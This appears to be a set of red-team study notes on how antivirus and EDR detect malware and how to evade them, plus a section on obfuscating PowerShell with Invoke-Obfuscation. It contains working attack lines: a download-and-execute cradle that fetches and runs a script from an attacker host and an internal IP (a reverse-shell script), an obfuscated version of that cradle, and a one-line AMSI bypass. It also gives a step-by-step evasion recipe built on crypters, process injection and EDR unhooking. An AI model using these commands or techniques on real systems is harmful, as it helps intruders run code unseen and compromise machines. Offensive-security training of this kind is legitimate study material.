# AV Detection Methods & Evasion Techniques

## 🔍 How Antivirus Detects Malware

### 1. **Signature-Based Detection**
- **What it is**: Matches file byte patterns against a database of known malware signatures  
- **How to bypass**:  
  - Modify payload bytes (encoding, encryption, polymorphism)  
  - Use custom shellcode or crypters  
  - Avoid public payloads (e.g., default Meterpreter)

> ⚠️ **Limitation**: Only detects **known** malware — useless against novel or obfuscated code

---
### 2. **Heuristic-Based Detection**

- **What it is**: Analyzes code structure for suspicious patterns:
  - Unusual API calls (`VirtualAlloc`, `CreateRemoteThread`)
  - Packing/obfuscation indicators
  - Suspicious import tables
- **How it works**: Static analysis + rule-based scoring

> 💡 Example: A binary that decrypts itself in memory → flagged as "packed"

---
### 3. **Behavior-Based Detection (EDR)**

- **What it is**: Monitors **runtime behavior**:
  - Process injection
  - LSASS access
  - Command-line anomalies (`powershell -e <base64>`)
- **Used by**: Modern EDRs (Defender for Endpoint, CrowdStrike, SentinelOne)

> 🔥 **Most dangerous**: Catches **unknown** malware based on actions, not signatures

---
## 🛡️ AV Evasion Techniques

### On-Disk Evasion (Avoid file detection)

| Technique | How It Works | Purpose |
|----------|--------------|--------|
| **Obfuscation** | Renames variables, adds junk code, control flow flattening | Breaks static analysis |
| **Encoding** | Reversible transformation (e.g., Base64, XOR) | Changes file signature |
| **Packing** | Compresses binary into new executable format | Alters file structure/signature |
| **Crypters** | Encrypts payload + decryptor stub; decrypts in memory | Hides original payload on disk |

> ✅ **Goal**: Deliver payload without triggering file-based AV alerts

---
### In-Memory Evasion (Avoid runtime detection)

| Technique | How It Works | Purpose |
|----------|--------------|--------|
| **Process Injection** | Injects shellcode into legitimate process (e.g., `explorer.exe`) | Hides malicious activity under trusted process |
| **Direct Syscalls** | Bypasses Windows API hooks by calling kernel directly | Evades EDR user-mode hooks |
| **Reflective Loading** | Loads DLL entirely in memory (no disk writes) | Avoids file scanning |
| **Unhooking** | Restores original API behavior by patching EDR hooks | Disables EDR monitoring |

> ✅ **Goal**: Execute payload without triggering behavioral alerts

---
## 💡 Real-World Red Team Approach

1. **On-disk**: Use **custom crypter** or **donut** to deliver payload  
2. **In-memory**: Inject into **signed Microsoft process** (e.g., `dllhost.exe`)  
3. **Post-execution**: Use **sleep obfuscation**, **indirect syscalls**, and **token impersonation** to avoid EDR

> 🔥 **Golden Rule**:  
> **Signature evasion = easy**  
> **Behavioral evasion = hard**  
> Modern engagements require **both**.

---
---
# Obfuscating PowerShell Code

## 🛠️ Invoke-Obfuscation

### What It Is

- **Open-source PowerShell obfuscator** (PowerShell v2.0+ compatible)
- **GitHub**: [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- **Purpose**: Bypass command-line logging (Sysmon EID 1, Windows EID 4688) and static analysis

### Key Features
| Technique | Example |
|----------|---------|
| **Token Obfuscation** | `IEX` → `${i}n${v}o${k}e-${e}x${p}r${e}s${s}i${o}n` |
| **String Encoding** | Base64, hex, binary, octal |
| **Launchers** | `powershell -enc`, `wmic`, `rundll32`, `mshta` |
| **Compression** | Converts multi-line scripts to one-liners |
| **AST Manipulation** | Alters code structure without changing logic |

### Basic Usage
```powershell
# Import module
Import-Module ./Invoke-Obfuscation.psd1

# Launch interactive menu
Invoke-Obfuscation

# CLI example: Obfuscate + encode + launch via stdin
Invoke-Obfuscation -ScriptBlock {IEX(New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')} -Command 'Token\All\1,Encoding\1,Launcher\Stdin++' -Quiet
```

### Output Example
Original:
```powershell
IEX (New-Object Net.WebClient).DownloadString('http://10.10.100.8/rev.ps1')
```

Obfuscated:
```powershell
& ( $VeRBosEprEFerenCe.ToString()[1,3]+'x'-Join'') ( (NeW-ObJeCt  N'et'.WE'bClieNT ).('dOWnlOad'sTrinG').INvoke( 'htTp://10.10.100.8/rEv.Ps1' ) )
```

---
## 💡 Pro Tips

- **Always test obfuscated code** — over-obfuscation breaks execution
- **Combine with AMSI bypass**:
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiContext','NonPublic,Static').SetValue($null,$null)
  ```
- **Use in-memory execution** — avoid dropping files to disk
- **Layer techniques**: Token obfuscation + encoding + non-standard launcher (`wmic`/`mshta`)

> 🔥 **Golden Rule**:  
> Obfuscation isn't about making code unreadable — it's about breaking detection signatures while keeping functionality intact.

